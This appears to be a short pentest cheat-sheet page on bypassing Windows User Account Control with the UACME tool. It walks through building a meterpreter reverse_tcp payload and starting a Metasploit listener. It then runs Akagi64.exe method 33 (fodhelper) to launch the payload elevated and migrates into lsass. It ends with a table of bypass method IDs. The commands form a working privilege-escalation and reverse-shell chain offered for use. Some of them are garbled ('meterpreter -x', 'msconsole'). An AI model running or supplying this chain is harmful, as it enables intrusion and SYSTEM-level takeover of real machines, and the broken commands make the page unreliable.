# UACME - Best

#### UACME

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)\
[https://github.com/hfiref0x/UACME/issues/114](https://github.com/hfiref0x/UACME/issues/114) # Windows 11 as of 2021...&#x20;

{% code overflow="wrap" %}
```bash
# @ Commando VM 
# Complile UACME and transfer Akagi64.exe to Kali 
Use Visual Studio to compile 

# @ Kali 
# Reverse Shell
meterpreter -x windows/x64/meterpreter/reverse_tcp LHOST <IP Address> LPORT <PORT> > shell.exe

# Listener
vi handler.rc

use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP ADddress>
set LPORT <PORT>

msconsole -r handler.rc 

# @Victim
cd C:\Users\IEUSer>

# Upload Akagi64.exe and shell.exe to the Target machine

# check the number - https://github.com/hfiref0x/UACME 
C:\Users\IEUSer> .\Akagi64.exe 33 C:\Users\IEUSer\shell.exe

# @Kali
meterpreter> getuid
meterpreter> getprivs
meterpreter> pgrep lsass
628 
meterpreter> migrate 628 
meterpreter> getuid 
```
{% endcode %}

![](<../../.gitbook/assets/image (8).png>)

### Common Method IDs&#x20;

| Method ID | Bypass Technique                        |
| --------- | --------------------------------------- |
| 33        | fodhelper.exe                           |
| 34        | DiskCleanup scheduled task              |
| 70        | fodhelper.exe using CurVer registry key |
